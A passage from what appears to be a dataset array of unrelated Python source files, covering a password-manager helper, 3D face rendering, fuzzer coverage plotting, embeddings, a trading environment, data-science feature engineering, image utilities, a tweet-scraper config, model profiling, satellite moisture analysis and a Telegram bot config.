def getAllSites(self) -> list:\r\n        # passwordManager.load_passwordFile(self, self.pwd_file)\r\n        return list(self.pwd_dict)\r\n\r\n    def delete_site(self, targetedSite):\r\n        newList: list = []\r\n\r\n        with open(self.pwd_file, 'r') as f:\r\n            lines: list = f.readlines()\r\n            for line in lines:\r\n                site, email, encrypted_pwd = line.split(':')\r\n                if targetedSite != site:\r\n                    newList.append(line)\r\n\r\n        with open(self.pwd_file, 'w') as f:\r\n            for line in newList:\r\n                f.write(line)\r\n\r\n        passwordManager.load_passwordFile(self, self.pwd_file)\r\n",
    "# check the sync of 3dmm feature and the audio\nimport cv2\nimport numpy as np\nfrom .models.bfm import ParametricFaceModel\nfrom .models.facerecon_model import FaceReconModel\nimport torch\nimport subprocess, platform\nimport scipy.io as scio\nfrom tqdm import tqdm \n\n# draft\ndef gen_composed_video(args, device, first_frame_coeff, coeff_path, audio_path, save_path, exp_dim=64):\n    \n    coeff_first = scio.loadmat(first_frame_coeff)['full_3dmm']\n\n    coeff_pred = scio.loadmat(coeff_path)['coeff_3dmm']\n\n    coeff_full = np.repeat(coeff_first, coeff_pred.shape[0], axis=0) # 257\n\n    coeff_full[:, 80:144] = coeff_pred[:, 0:64]\n    coeff_full[:, 224:227]  = coeff_pred[:, 64:67] # 3 dim translation\n    coeff_full[:, 254:]  = coeff_pred[:, 67:] # 3 dim translation\n\n    tmp_video_path = '/tmp/face3dtmp.mp4'\n\n    facemodel = FaceReconModel(args)\n    \n    video = cv2.VideoWriter(tmp_video_path, cv2.VideoWriter_fourcc(*'mp4v'), 25, (224, 224))\n\n    for k in tqdm(range(coeff_pred.shape[0]), 'face3d rendering:'):\n        cur_coeff_full = torch.tensor(coeff_full[k:k+1], device=device)\n\n        facemodel.forward(cur_coeff_full, device)\n\n        predicted_landmark = facemodel.pred_lm # TODO.\n        predicted_landmark = predicted_landmark.cpu().numpy().squeeze()\n\n        rendered_img = facemodel.pred_face\n        rendered_img = 255. * rendered_img.cpu().numpy().squeeze().transpose(1,2,0)\n        out_img = rendered_img[:, :, :3].astype(np.uint8)\n\n        video.write(np.uint8(out_img[:,:,::-1]))\n\n    video.release()\n\n    command = 'ffmpeg -v quiet -y -i {} -i {} -strict -2 -q:v 1 {}'.format(audio_path, tmp_video_path, save_path)\n    subprocess.call(command, shell=platform.system() != 'Windows')\n\n",
    "import os\n\nimport pandas as pd\nimport numpy as np\nimport matplotlib.pyplot as plt\nfrom tqdm import tqdm\nfrom matplotlib.figure import Figure\nfrom matplotlib.ticker import MultipleLocator, FormatStrFormatter\n\nafl_family = ['aflpp', 'aflpp-Z']\nzest_family = ['zest']\ndist_family = [\n    'dist-VH', 'dist-VJ',\n    'dist-AH', 'dist-AJ',\n    'dist-PH', 'dist-PJ',\n]\nc_targets = ['cxxfilt', 'objdump', 'readelf', 'xmllint']\njava_targets = ['ant', 'bcel', 'closure', 'rhino']\nfigsize = (5.0, 4.5)\nshapes = {                                  # Shapes for lines in figures, each tuple is (<color>,<marker>,<line>)\n    'dist-VH': ('red', 'o'),\n    'dist-VJ': ('forestgreen', 'D'),\n    'dist-AH': ('darkorange', 'o'),\n    'dist-AJ': ('royalblue', 'D'),\n    'dist-PH': ('sienna', 'o'),\n    'dist-PJ': ('olive', 'D'),\n    'aflpp': ('black', '^'),\n    'aflpp-Z': ('gray', 'v'),\n    'zest': ('black', '^'),\n}\nmarkevery = 0.05\nmarkersize = 3.5\ncline_width = 2                           # Line width for curve\ngline_width = 0.5                           # Line width for grid\n# plt.rcParams['font.family'] = 'Monospace'   # Set plot style. Use monospaced fonts\nplt.rcParams['font.size'] = 16\n\n\ndef get_fuzzers(prog_lang: str) -> list:\n    if prog_lang.upper() == 'C':\n        return afl_family + dist_family\n    elif prog_lang.upper() == 'JAVA':\n        return zest_family + dist_family\n    raise RuntimeError(f'Unsupported program language: `{prog_lang}`')\n\n\ndef get_targets(prog_lang: str) -> list:\n    if prog_lang.upper() == 'C':\n        return c_targets\n    elif prog_lang.upper() == 'JAVA':\n        return java_targets\n    raise RuntimeError(f'Unsupported program language: `{prog_lang}`')\n\n\ndef parse_x_data(prog_lang: str, df: pd.DataFrame, x_name: str):\n    _X = None\n    if prog_lang.upper() == 'C':\n        if x_name == 'time':\n            _X = df.index / 3600  # Default in hours\n        elif x_name == 'execution':\n            _X = df['total_execs']\n    elif prog_lang.upper() == 'JAVA':\n        if x_name == 'time':\n            _X = df.index / 3600  # Default in hours\n        elif x_name == 'execution':\n            _X = df['# numTrials']\n    else:\n        raise RuntimeError(f'Unsupported program language: `{prog_lang}`')\n    return _X\n\n\ndef parse_y_data(prog_lang: str, df: pd.DataFrame, y_name: str):\n    _Y = None\n    if prog_lang.upper() == 'C':\n        if y_name == 'coverage':\n            _Y = df['edges_found']\n        elif y_name == 'crash':\n            _Y = df['saved_crashes']\n    elif prog_lang.upper() == 'JAVA':\n        if y_name == 'coverage':\n            # _Y = df['all_cov']\n            _Y = df['valid_cov']\n        elif y_name == 'crash':\n            _Y = df['unique_crashes']\n    else:\n        raise RuntimeError(f'Unsupported program language: `{prog_lang}`')\n    return _Y\n\n\ndef parse_x_label(prog_lang: str, x_name: str) -> str:\n    c_xlab_map = {\n        'time': 'Time (Hours)',\n        'execution': '#Executions',\n    }\n    java_xlab_map = {\n        'time': 'Time (Hours)',\n        'execution': '#Trials',\n    }\n    if prog_lang.upper() == 'C':\n        return c_xlab_map[x_name]\n    elif prog_lang.upper() == 'JAVA':\n        return java_xlab_map[x_name]\n    raise RuntimeError(f'Unsupported program language: `{prog_lang}`')\n\n\ndef parse_y_label(prog_lang: str, y_name: str) -> str:\n    c_ylab_map = {\n        'coverage': '#Edges',\n        'crash': '#Crashes',\n    }\n    java_ylab_map = {\n        'coverage': '#Valid Edges',\n        'crash': '#Crashes',\n    }\n    if prog_lang.upper() == 'C':\n        return c_ylab_map[y_name]\n    elif prog_lang.upper() == 'JAVA':\n        return java_ylab_map[y_name]\n    raise RuntimeError(f'Unsupported program language: `{prog_lang}`')\n\n\ndef draw_fuzz_plot(prog_lang: str, df_dict: dict,\n                   x_name: str = 'time', y_name: str = 'coverage', show_legend: bool = False) -> Figure:\n    plt.clf()\n    _fig, _ax = plt.subplots(1, 1, figsize=figsize)\n    _y_min = 1000000000\n    _y_max = 0\n    _xy_dict = {}\n    _fuzzers = get_fuzzers(prog_lang=prog_lang)\n    for _fuzzer in _fuzzers:\n        if _fuzzer not in df_dict:\n            continue\n        # Prepare data\n        _X = parse_x_data(prog_lang, df_dict[_fuzzer], x_name)\n        _Y = parse_y_data(prog_lang, df_dict[_fuzzer], y_name)\n        _y_min = min(_y_min, _Y[_Y > 0].min())\n        _y_max = max(_y_max, _Y.max())\n        # if y_name == 'coverage':\n        #     print(y_name, _y_min)\n        # Add into xy dict. Later to replace 0 with global min value\n        _xy_dict[_fuzzer] = (_X, _Y)\n    for _fuzzer in _xy_dict:\n        _X = _xy_dict[_fuzzer][0]\n        _Y = _xy_dict[_fuzzer][1]\n        # if y_name == 'coverage':\n        #     print(_Y.replace(to_replace=0, value=_y_min))\n        # Draw graph\n        _fuzzer_label = str(_fuzzer).upper()\n        _ax.plot(_X, _Y.replace(to_replace=0, value=_y_min),\n                 label=_fuzzer_label, linewidth=cline_width,\n                 markevery=markevery, markersize=markersize,\n                 color=shapes[_fuzzer][",
    "from openai import OpenAI\n\nclient = OpenAI()\n\n# tokens of \"\u7528\u7b80\u5355\u8bed\u8a00\u8bb2\u89e3Transformer\u795e\u7ecf\u7f51\u7edc\u67b6\u6784\"\ntokens = [11883, 99337, 24946, 73981, 78244, 10414, 110, 50338, 47458, 55228, 252, 54493, 72456, 20119, 114, 78935]\ntokens_as_strings = [str(token) for token in tokens]\n\nresponse = client.embeddings.create(\n    model=\"text-embedding-3-small\", input=tokens_as_strings, encoding_format=\"float\", dimensions=6\n)\nprint(f\"length of tokens: {len(response.data)}\")\n# length of tokens: 16\nfor i in range(len(response.data)):\n    embedding_dim = response.data[i].embedding\n    print(f\"embedding_dim[{i:02}]: {embedding_dim}\")\n# embedding_dim[00]: [-0.3633453, -0.33893964, 0.5140128, 0.32748395, -0.3561232, -0.5047984]\n# embedding_dim[01]: [-0.48211774, 0.33215308, 0.7394951, 0.078132406, -0.028996263, -0.32161838]\n# embedding_dim[02]: [-0.19790855, -0.034714203, 0.86141354, 0.06291166, -0.40263462, -0.22698326]\n# embedding_dim[03]: [-0.45271215, 0.15769157, 0.7281278, 0.23677413, -0.4258146, -0.05133263]\n# embedding_dim[04]: [-0.77712417, -0.029864147, 0.3315905, 0.48228958, -0.030618956, -0.22736134]\n# embedding_dim[05]: [-0.1465702, -0.55493087, 0.63132393, 0.44898948, -0.053916577, -0.25980854]\n# embedding_dim[06]: [0.09254342, -0.8287471, 0.2785865, -0.4033236, 0.2528741, 0.019709306]\n# embedding_dim[07]: [-0.3082398, 0.20658346, 0.86035013, -0.23405814, -0.25878537, 0.018872492]\n# embedding_dim[08]: [-0.32759163, 0.22439198, 0.68951416, 0.0753833, -0.583626, -0.14352815]\n# embedding_dim[09]: [-0.11340556, 0.13960978, 0.6583482, 0.06108476, -0.68639284, 0.24363792]\n# embedding_dim[10]: [0.5715848, -0.07974044, 0.7571991, 0.1993511, -0.15035093, -0.17673564]\n# embedding_dim[11]: [-0.39767742, -0.13064946, 0.72660667, -0.26339492, -0.41193008, 0.24033913]\n# embedding_dim[12]: [-0.09375604, -0.10740708, 0.7527027, 0.24173702, -0.58054805, -0.13281316]\n# embedding_dim[13]: [-0.26784053, -0.10819349, 0.8627285, 0.10672506, 0.3211737, -0.24023418]\n# embedding_dim[14]: [0.119970955, -0.5766705, 0.5151158, 0.28266576, 0.17140155, -0.5276697]\n# embedding_dim[15]: [-0.62758964, 0.3103241, 0.59859884, 0.18160084, 0.013691519, -0.3440106]",
    "from uuid import UUID\n\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlmodel import Field, Session, SQLModel\n\nfrom app.database import engine\n\n\nclass PlayerBase(SQLModel):\n    playername: str = Field(index=True, unique=True)\n    username: str = Field(index=True, foreign_key=\"user.username\")\n    points: int = 0\n    games_played: int = 0\n    games_won: int = 0\n\n\nclass Player(PlayerBase, table=True):\n    id: UUID | None = Field(default=None, primary_key=True)\n\n\nclass PlayerCreate(PlayerBase):\n    pass\n\n\nclass PlayerRead(PlayerBase):\n    id: UUID\n\n\ndef create_fake_players():\n    player1: Player = Player(\n        playername=\"player1\",\n        username=\"user1\",\n        points=1337,\n        games_played=1,\n        games_won=1,\n        id=UUID(\"123e4567-e89b-12d3-a456-426614174000\", version=4),\n    )\n    player2: Player = Player(\n        playername=\"player2\",\n        username=\"user2\",\n        points=7331,\n        games_played=1,\n        games_won=1,\n        id=UUID(\"455f6170-238e-401f-8077-2121c72412bf\", version=4),\n    )\n    db_player1 = Player.model_validate(player1)\n    db_player2 = Player.model_validate(player2)\n    session = Session(engine)\n    session.add(db_player1)\n    session.add(db_player2)\n    try:\n        session.commit()\n    except IntegrityError:\n        pass\n",
    "import gym\nfrom gym import spaces\nimport pandas as pd\nimport numpy as np\n\nclass BitcoinTradingEnv(gym.Env):\n    def __init__(self, df, initial_balance=200, trading_fee=0.001, risk_factor=0.1):\n        super(BitcoinTradingEnv, self).__init__()\n        self.df = df\n        self.initial_balance = initial_balance\n        self.trading_fee = trading_fee\n        self.risk_factor = risk_factor\n        self.action_space = spaces.Discrete(3)  # 0: Hold, 1: Long, 2: Short\n        self.observation_space = spaces.Box(low=0, high=np.inf, shape=(5,), dtype=np.float32)  # Open, High, Low, Close, Volume\n        self.max_steps = len(df)\n        \n    def reset(self):\n        self.balance = self.initial_balance\n        self.position = 0\n        self.current_step = 0\n        return self._get_obs()\n    \n    def step(self, action):\n        if self.current_step >= self.max_steps - 1:\n            self.current_step = 0  # Reset to the beginning of the data\n        \n        prev_close = self.df.iloc[self.current_step]['Close']\n        self.current_step += 1\n        current_close = self.df.iloc[self.current_step]['Close']\n        \n        if action == 1:  # Long\n            self.position = self.balance / current_close\n            self.balance -= self.position * current_close * (1 + self.trading_fee)\n        elif action == 2:  # Short\n            self.position = -self.balance / current_close\n            self.balance += abs(self.position) * current_close * (1 - self.trading_fee)\n        \n        self.balance += self.position * (current_close - prev_close)\n        \n        reward = (self.balance - self.initial_balance) / self.initial_balance\n        reward -= self.risk_factor * abs(self.position) * abs(current_close - prev_close) / prev_close\n        \n        if self.balance <= 0:\n            done = True\n        elif self.balance >= 1000000:  # 1 million target\n            done = True\n            reward += 1  # Additional reward for reaching target\n        else:\n            done = False\n            \n        info = {'balance': self.balance}\n            \n        return self._get_obs(), reward, done, info\n    \n    def _get_obs(self):\n        obs = np.array([\n            self.df.iloc[self.current_step]['Open'],\n            self.df.iloc[self.current_step]['High'],\n            self.df.iloc[self.current_step]['Low'],\n            self.df.iloc[self.current_step]['Close'],\n            self.df.iloc[self.current_step]['Volume']\n        ], dtype=np.float32)\n        return obs",
    "##################################################################\r\n# Metinler \u00dczerinden \u00d6zellik T\u00fcretme\r\n##################################################################\r\nimport numpy as np\r\nimport pandas as pd\r\nimport matplotlib.pyplot as plt\r\nimport seaborn as sns\r\nimport missingno as msno\r\nfrom datetime import date\r\nfrom sklearn.metrics import accuracy_score\r\nfrom sklearn.model_selection import train_test_split\r\nfrom sklearn.neighbors import LocalOutlierFactor  # \u00e7ok de\u011fi\u015fkenli ayk\u0131r\u0131 de\u011fer yakalama y\u00f6ntemi\r\nfrom sklearn.preprocessing import StandardScaler, MinMaxScaler, LabelEncoder, RobustScaler  # d\u00f6n\u00fc\u015ft\u00fcrme fonksiyonlar\u0131\r\n\r\npd.set_option(\"display.max_columns\", None)\r\npd.set_option(\"display.max_rows\", None)\r\npd.set_option(\"display.float_format\", lambda x: \"%.3f\" % x)\r\npd.set_option(\"display.width\", 500)\r\n\r\n\r\ndef load():\r\n    data = pd.read_csv(\"datasets/titanic.csv\")\r\n    return data\r\n\r\n\r\ndef load_application_train():\r\n    data = pd.read_csv(\"datasets/application_train.csv\")\r\n    return data\r\n\r\n\r\ndf = load()\r\ndf.head()\r\n\r\n####################\r\n# Letter Count\r\n###################\r\n\r\ndf[\"NEW_NAME_COUNT\"] = df[\"Name\"].str.len()\r\ndf.head()\r\n\r\n####################\r\n# Word Count\r\n###################\r\n\r\ndf[\"NEW_NAME_WORD_COUNT\"] = df[\"Name\"].apply(lambda x: len(x.split(\" \")))\r\ndf.head()\r\n\r\n##########################\r\n# \u00d6zel Yap\u0131lar\u0131 Yakalamak\r\n#########################\r\n\r\ndf[\"NEW_NAME_DR\"] = df[\"Name\"].apply(lambda x: len([x for x in x.split() if x.startswith(\"Dr\")]))\r\n\r\ndf.groupby(\"NEW_NAME_DR\").agg({\"Survived\": [\"mean\", \"count\"]})\r\n\r\n#################################\r\n# Regex ile De\u011fi\u015fken T\u00fcretmek\r\n################################\r\n# D\u00fczenli ifadeler ile de\u011fi\u015fken t\u00fcretmek bir pattern yakalamaya \u00e7al\u0131\u015f\u0131yoruz.\r\n\r\ndf[\"NEW_TITLE\"] = df.Name.str.extract(\" ([A-Za-z]+)\\.\", expand=False)\r\ndf.head()\r\n# .str.extract() fonksiyonu, bir dize i\u00e7inde belirli bir desene g\u00f6re e\u015fle\u015fen k\u0131s\u0131mlar\u0131 ay\u0131klamak i\u00e7in kullan\u0131l\u0131r.\r\n\r\ndf[[\"NEW_TITLE\", \"Survived\", \"Age\"]].groupby([\"NEW_TITLE\"]).agg({\"Survived\": \"mean\", \"Age\": [\"count\", \"mean\"]})\r\n",
    "# This program is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program. If not, see <http://www.gnu.org/licenses/>.\n\n__all__ = [\n    'PixelImage',\n    'generatePolygons',\n]\n\nfrom collections import defaultdict\nfrom enum import IntFlag\nimport itertools\n\n\nclass PixelImage:\n    ''' Class for managing a pixel image.\n\n    Each pixel is a 8-bit integer.\n    It also store the position and size of the image, allowing easier operation.\n    '''\n\n    __slots__ = ['__data', '_x', '_y', '_w', '_h']\n\n    def __init__(self, src=None, *, x=0, y=0, width=0, height=0, data=None):\n        if src is not None:\n            self._x, self._y, self._w, self._h, self.__data = src._x, src._y, src._w, src._h, bytearray(\n                src.__data)\n            return\n        if width < 0:\n            raise ValueError('Width < 0')\n        if height < 0:\n            raise ValueError('Height < 0')\n\n        self._x, self._y, self._w, self._h = x, y, width, height\n\n        if data is not None:\n            data = bytearray(data)\n            if len(data) != width * height:\n                raise ValueError(\n                    f'Data length mismatch (expected {width * height}, got {len(data)})'\n                )\n            self.__data = data\n        else:\n            self.__data = bytearray(width * height)\n\n    @property\n    def x(self):\n        return self._x\n\n    @property\n    def y(self):\n        return self._y\n\n    @property\n    def x_end(self):\n        return self._x + self._w\n\n    @property\n    def y_end(self):\n        return self._y + self._h\n\n    @property\n    def width(self):\n        return self._w\n\n    @property\n    def height(self):\n        return self._h\n\n    @property\n    def data(self):\n        return bytes(self.__data)\n\n    def __getitem__(self, key):\n        ''' Gets a pixel at (x, y).\n\n        Defaults to 0 if out of bounds.\n        '''\n        x, y = key\n        x -= self._x\n        y -= self._y\n        if x < 0 or x >= self._w or y < 0 or y >= self._h:\n            return 0\n        return self.__data[x + y * self._w]\n\n    def __setitem__(self, key, value):\n        ''' Sets a pixel at (x, y).\n        \n        Do nothing if out of bounds.\n        '''\n        x, y = key\n        x -= self._x\n        y -= self._y\n        if x < 0 or x >= self._w or y < 0 or y >= self._h:\n            return\n        self.__data[x + y * self._w] = value\n\n    def __len__(self):\n        return self._w * self._h\n\n    def __str__(self):\n        return '\\n'.join(' '.join(\n            str(self[x, y]) for x in range(self.x, self.x_end))\n                         for y in range(self.y, self.y_end))\n\n    def __repr__(self):\n        return f'PixelImage(\\n  x={self._x},\\n' \\\n            f'  y={self._y},\\n' \\\n            f'  width={self._w},\\n' \\\n            f'  height={self._h},\\n' \\\n            f'  data=bytes([\\n    ' + \\\n            ',\\n    '.join(\n                ', '.join(\n                    f'{self[x, y]:#04x}' for x in range(self.x, self.x_end)\n                ) for y in range(self.y, self.y_end)\n            ) + \\\n            '\\n  ])\\n)'\n\n    def __hash__(self):\n        return hash((self._x, self._y, self._w, self._h, self.__data))\n\n    def __eq__(self, other):\n        if not isinstance(other, PixelImage):\n            return NotImplemented\n        return self._x == other._x and \\\n            self._y == other._y and \\\n            self._w == other._w and \\\n            self._h == other._h and \\\n            self.__data == other.__data\n\n    def __ne__(self, other):\n        if not isinstance(other, PixelImage):\n            return NotImplemented\n        return self._x != other._x or \\\n            self._y != other._y or \\\n            self._w != other._w or \\\n            self._h != other._h or \\\n            self.__data != other.__data\n\n    def __or__(self, other):\n        if not isinstance(other, PixelImage):\n            return NotImplemented\n\n        if self.width == 0 or self.height == 0:\n            return other\n        elif other.width == 0 or other.height == 0:\n            return self\n        else:\n            x = min(self._x, other.x)\n            y = min(self._y, other.y)\n            x2 = max(self.x_end, other.x_end)\n            y2 = max(self.y_end, other.y_end)\n\n        ret = self.__class__(\n            x=x,\n            y=y,\n            width=x2 - x,\n            height=y2 - y,\n        )\n\n        dj = self._y - y\n        i_min = self._x - x\n        i_max = i_min + self._w\n        for j in range(self._h):\n            j_min = j * self._w\n            _j_min = (j + dj) * ",
    "'''\nterm: search term\nmode: modality to scrape the tweets. Default is 'term' which will look for tweets containing the search term. Other modes are 'hashtag' to search for a hashtag and 'user' to scrape tweets from a user profile\nnumber: number of tweets to scrape. Default is -1 (no limit).\nsince: date to start scraping from, formatted as YYYY-MM-DD. Default is None\nuntil: date to stop scraping at, formatted as YYYY-MM-DD. Default is None\nnear: location to search tweets from. Default is None (anywhere)\nlanguage: language of the tweets to search. Default is None (any language). The language must be specified as a 2-letter ISO 639-1 code (e.g. 'en' for English, 'es' for Spanish, 'fr' for French ...)\nto: user to which the tweets are directed. Default is None (any user). For example, if you want to search for tweets directed to @github, you would set this parameter to 'github'\nfilters: list of filters to apply to the search. Default is None. Valid filters are: 'nativeretweets', 'media', 'videos', 'news', 'verified', 'native_video', 'replies', 'links', 'images', 'safe', 'quote', 'pro_video'\nexclude: list of filters to exclude from the search. Default is None. Valid filters are the same as above\nmax_retries: max retries to scrape a page. Default is 5\n'''\n# search_term = 'jordanbpeterson'\n# search_term = 'PDChinese'\nsearch_term = 'KP_Taiwan'\nmode = 'user'\nnumber = 300\n# since = None\nsince = '2022-03-21'\nuntil = None\nnear = None\nlanguage = None\nto = None\nfilters = None\nexclude = None\nmax_retries = 3\n\n\n\n'''\nThe valid log_levels are:\nNone = no logs\n0 = only warning and error logs\n1 = previous + informational logs (default)\n\nThe skip_instance_check parameter is used to skip the check of the Nitter instances altogether during the execution of the script. \nIf you use your own instance or trust the instance you are relying on, then you can skip set it to 'True', otherwise it's better to leave it to false.\n'''\n\nlog_level = 1\nskip_instance_check = True",
    "image_path = './demo/demo.jpg'\nsentence = 'the most handsome guy'\nweights = './checkpoints/refcoco.pth'\ndevice = 'cuda:0'\n\n\nfrom flops_profiler.profiler import get_model_profile\n\n# pre-process the input image\nfrom PIL import Image\nimport torchvision.transforms as T\nimport numpy as np\n#img = Image.open(image_path).convert(\"RGB\")\nimg_ndarray = np.random.rand(224,224,3)  # (orig_h, orig_w, 3); for visualization\nimg = Image.fromarray(np.uint8(img_ndarray*255))\noriginal_w, original_h = 224,224  # PIL .size returns width first and height second\n\nimage_transforms = T.Compose(\n    [\n     T.Resize(480),\n     T.ToTensor(),\n     T.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225])\n    ]\n)\n\nimg = image_transforms(img).unsqueeze(0)  # (1, 3, 480, 480)\nimg = img.to(device)  # for inference (input)\n\n# pre-process the raw sentence\nfrom bert.tokenization_bert import BertTokenizer\nimport torch\ntokenizer = BertTokenizer.from_pretrained('bert-base-uncased')\nsentence_tokenized = tokenizer.encode(text=sentence, add_special_tokens=True)\nsentence_tokenized = sentence_tokenized[:20]  # if the sentence is longer than 20, then this truncates it to 20 words\n# pad the tokenized sentence\npadded_sent_toks = [0] * 20\npadded_sent_toks[:len(sentence_tokenized)] = sentence_tokenized\n# create a sentence token mask: 1 for real words; 0 for padded tokens\nattention_mask = [0] * 20\nattention_mask[:len(sentence_tokenized)] = [1]*len(sentence_tokenized)\n# convert lists to tensors\npadded_sent_toks = torch.tensor(padded_sent_toks).unsqueeze(0)  # (1, 20)\nattention_mask = torch.tensor(attention_mask).unsqueeze(0)  # (1, 20)\npadded_sent_toks = padded_sent_toks.to(device)  # for inference (input)\nattention_mask = attention_mask.to(device)  # for inference (input)\n\n# initialize model and load weights\nfrom bert.modeling_bert import BertModel\nfrom lib import segmentation\n\n# construct a mini args class; like from a config file\n\n\nclass args:\n    swin_type = 'base'\n    window12 = True\n    mha = ''\n    fusion_drop = 0.0\n\n\nsingle_model = segmentation.__dict__['lavt'](pretrained='', args=args)\nsingle_model.to(device)\nmodel_class = BertModel\nsingle_bert_model = model_class.from_pretrained('bert-base-uncased')\nsingle_bert_model.pooler = None\n\nmodel = single_model.to(device)\nbert_model = single_bert_model.to(device)\n\n\n# inference\nimport torch.nn.functional as F\nlast_hidden_states = bert_model(padded_sent_toks, attention_mask=attention_mask)[0]\nembedding = last_hidden_states.permute(0, 2, 1)\noutput = model(img, embedding, l_mask=attention_mask.unsqueeze(-1))\n\n\nwith torch.cuda.device(0):\n    batch_size = 1\n    flops, macs, params = get_model_profile(model=model, # model\n                                    input_shape=(batch_size, 3, 480, 480), # input shape to the model. If specified, the model takes a tensor with this shape as the only positional argument.\n                                    args=['l_feats','l_mask'], # list of positional arguments to the model.\n                                    kwargs={'l_feats':embedding,'l_mask':attention_mask.unsqueeze(-1)}, # dictionary of keyword arguments to the model.\n                                    print_profile=True, # prints the model graph with the measured profile attached to each module\n                                    detailed=True, # print the detailed profile\n                                    module_depth=-1, # depth into the nested modules, with -1 being the inner most modules\n                                    top_modules=1, # the number of top modules to print aggregated profile\n                                    warm_up=10, # the number of warm-ups before measuring the time of each module\n                                    as_string=True, # print raw numbers (e.g. 1000) or as human-readable strings (e.g. 1k)\n                                    output_file=None, # path to the output file. If None, the profiler prints to stdout.\n                                    ignore_modules=None, # the list of modules to ignore in the profiling\n                                    func_name='forward') # the function name to profile, \"forward\" by default, for huggingface generative models, `generate` is used\n\n\n    print(\"============================================================================================\")\n    print(f\"FLOPS: {flops}\")\n    print(f\"MACS: {macs}\")\n    print(f\"Params: {params}\")\n    print(\"============================================================================================\")\n\noutput = output.argmax(1, keepdim=True)  # (1, 1, 480, 480)\noutput = F.interpolate(output.float(), (original_h, original_w))  # 'nearest'; resize to the original image size\noutput = output.squeeze()  # (orig_h, orig_w)\noutput = output.cpu().data.numpy()  # (orig_h, orig_w)\n\n\n# show/save results\ndef overlay_davis(image, mask, colors=[[0, 0, 0], [255, 0, 0]], cscale=1, alpha=0.4):\n    from scipy.ndimage.morphology import binary_dilation\n\n    colors = np.reshape(colors, (-1, 3))\n    colors = np.atleast_",
    "import ee\r\nimport geopandas as gpd\r\nfrom datetime import datetime, timedelta\r\nfrom localpackage.utils import upload_dataframe_to_gcs, shp_to_ee_fmt, process_zonal_stats_chunks\r\nfrom localpackage.utils import  download_geodataframe_from_gcs\r\n\r\n\r\n# 2. Set JSON key as environment variable\r\nemail = \"farm-watch-project@data-enginerring-zoomcamp.iam.gserviceaccount.com\"\r\nkey_file = \"./data-enginerring-zoomcamp-b8719aa4a43e.json\"\r\n\r\n# Authenticate and initialize\r\ncredentials = ee.ServiceAccountCredentials(email=email, key_file=key_file)\r\nee.Initialize(credentials)\r\n\r\n# Get today's date\r\ntoday = datetime.today()\r\nsearch_start = (today - timedelta(days=7)).strftime('%Y-%m-%d')\r\nsearch_end = today.strftime('%Y-%m-%d')\r\n\r\n\r\nGCS_BUCKET = \"sammy_project_bucket2024\"\r\nGEOJSON_DATA = 'Nigeria_farmland.geojson'\r\n\r\ndef source_imagery(IMAGERY, BOUND):\r\n    # Filter and process Sentinel-2 image collection\r\n    dataset = (\r\n        ee.ImageCollection(IMAGERY)\r\n        .filterBounds(BOUND) # Filter to AOI box\r\n        .filterDate(search_start, search_end)  # Filter for single day\r\n        .sort(\"CLOUD_COVER\") # .filter(ee.Filter.lt('CLOUDY_PIXEL_PERCENTAGE', 50))  # Pre-filter for less cloud cover\r\n        .select(['B8', 'B11'])  # Select red (B4) and near-infrared (B8) bands\r\n        .mosaic()\r\n        .clip(BOUND)\r\n    )\r\n    return dataset\r\n\r\ndef getNDMI(image):\r\n    # Normalized difference moisture index (ndmi)\r\n    ndmi = image.normalizedDifference(['B8','B11']).rename(\"ndmi\")\r\n    image = image.addBands(ndmi)\r\n    return image\r\n\r\ndef main(request):\r\n    try:\r\n        scale = 100\r\n        chunk_size = 4000  \r\n        farm_gdf = download_geodataframe_from_gcs(GCS_BUCKET, GEOJSON_DATA, key_file)\r\n        imagery = \"COPERNICUS/S2_SR_HARMONIZED\"\r\n        farm_boundary = ee.Geometry.MultiPolygon(shp_to_ee_fmt(farm_gdf))\r\n        image = source_imagery(imagery, farm_boundary)\r\n        ndmi = getNDMI(image)\r\n        farmland_ndmi = process_zonal_stats_chunks(ndmi, scale, farm_gdf, chunk_size)\r\n\r\n        today = datetime.today() \r\n        farmland_ndmi['processed_date'] = today.strftime('%Y-%m-%d')\r\n        gdf_joined = farmland_ndmi.merge(farm_gdf, how='inner', left_index=True, right_index=True)\r\n        farmland_data = gdf_joined[['id', 'ndmi', 'processed_date']]\r\n\r\n        bucket_name = 'sammy_project_bucket2024'\r\n        destination_blob_path = f'ndmi/ndmi_{today.strftime(\"%Y-%m-%d\")}.csv'\r\n\r\n        upload_dataframe_to_gcs(farmland_data, bucket_name, destination_blob_path, key_file)\r\n        \r\n        response = {'statusCode': 200, 'body': \"Successfully\"}\r\n    \r\n    except Exception as e:\r\n        print(f\"Error in Cloud function: {str(e)}\")\r\n        response = {'statusCode': 500, 'body': \"Error\"}\r\n\r\n    return response\r\n",
    "import re\nimport os\nimport sys\nimport math\nimport asyncio\nimport logging\nimport logging.handlers\nimport subprocess\nimport tomlkit\nfrom telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup\nfrom telegram.ext import filters, MessageHandler, ApplicationBuilder, ContextTypes, \\\n                        CommandHandler, CallbackQueryHandler\n\n# global\nCFG_PATH = 'tdl_bot_config.toml'\nRE_STR = r'\\x1b\\[[0-9;]*[a-zA-Z]'\nKEYBOARD_MAX_ROW_LEN = 6\nKEYBOARD_MAX_COL_LEN = 4\nKEYBOARD_MAX_ONE_PAGE_LEN = KEYBOARD_MAX_ROW_LEN * KEYBOARD_MAX_COL_LEN\n\ng_config = {\n    \"debug\": \"False\",\n    \"bot_token\": \"123456789:abcdefghijk\",\n    \"download_path\": \"/path/to/save/download/media\",\n    \"proxy_url\": \"httpx://USERNAME:PASSWORD@PROXY_HOST:PROXY_PORT\",\n    \"tags\": ['dog', 'cat']\n}\n\n\n# enable python-telegram-bot logging\nlogging.basicConfig(\n    style=\"{\",\n    format=\"{asctime} {levelname:<8} {funcName}:{lineno} {message}\",\n    datefmt=\"%m-%d %H:%M:%S\",\n    level=logging.INFO\n)\n\n# set higher logging level for httpx to avoid all GET and POST requests being logged\nlogging.getLogger(\"httpx\").setLevel(logging.WARNING)\nformatter = logging.Formatter(\n    style=\"{\",\n    fmt=\"{asctime} {levelname:<8} {funcName}:{lineno} {message}\",\n    datefmt=\"%m-%d 